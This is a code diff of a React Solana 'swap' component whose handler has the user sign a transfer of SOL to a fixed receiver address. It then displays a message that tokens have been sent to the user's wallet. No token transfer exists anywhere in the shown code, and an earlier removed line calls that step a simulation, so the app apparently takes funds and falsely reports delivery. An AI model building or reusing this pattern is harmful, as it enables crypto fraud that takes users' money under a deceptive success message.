@@ -93,44 +93,56 @@ function SwapComponent() {
 
   const handleSwap = async () => {
     const wallet = window.solana;
+  
     if (!wallet || !wallet.isConnected) {
       setStatus("Please connect your wallet first.");
       return;
     }
-
+  
     if (parseFloat(amountSOL) > (solBalance || 0)) {
       setStatus("Insufficient SOL balance.");
       return;
     }
-
+  
     try {
       const publicKey = wallet.publicKey;
       const receiverPublicKey = new PublicKey(RECEIVER_ADDRESS);
-
+  
+      console.log("Sender PublicKey:", publicKey.toString());
+      console.log("Receiver PublicKey:", receiverPublicKey.toString());
+      console.log("Amount to transfer (in lamports):", parseFloat(amountSOL) * 1e9);
+  
+      // Fetch the latest blockhash
+      const { blockhash } = await connection.getLatestBlockhash();
+      console.log("Fetched recentBlockhash:", blockhash);
+  
       // Create the SOL transfer transaction
-      const transaction = new Transaction().add(
+      const transaction = new Transaction();
+      transaction.add(
         SystemProgram.transfer({
           fromPubkey: publicKey,
           toPubkey: receiverPublicKey,
           lamports: parseFloat(amountSOL) * 1e9, // Convert SOL to lamports
         })
       );
-
-      // Send the transaction
+  
+      // Assign the blockhash and fee payer
+      transaction.recentBlockhash = blockhash;
+      transaction.feePayer = publicKey;
+  
+      console.log("Transaction prepared:", transaction);
+  
+      // Sign and send the transaction
       const signature = await wallet.signAndSendTransaction(transaction);
-      setStatus(`Transaction sent. Signature: ${signature}`);
-      console.log(`Transaction successful. Signature: ${signature}`);
-
-      // Simulate sending tokens to the user
-      const tokenAmount = parseFloat(amountSOL) * EXCHANGE_RATE;
-      setStatus(
-        `Swap complete! ${tokenAmount} tokens have been sent to your wallet.`
-      );
+      console.log("Transaction signature:", signature);
+  
+      setStatus("Swap complete! Tokens have been sent to your wallet.");
     } catch (error) {
-      console.error("Swap failed:", error);
+      console.error("Transaction failed:", error);
       setStatus("Swap failed. Check the console for details.");
     }
   };
+  
 
   if (!isClient) return null; // Prevent server-side rendering issues
 
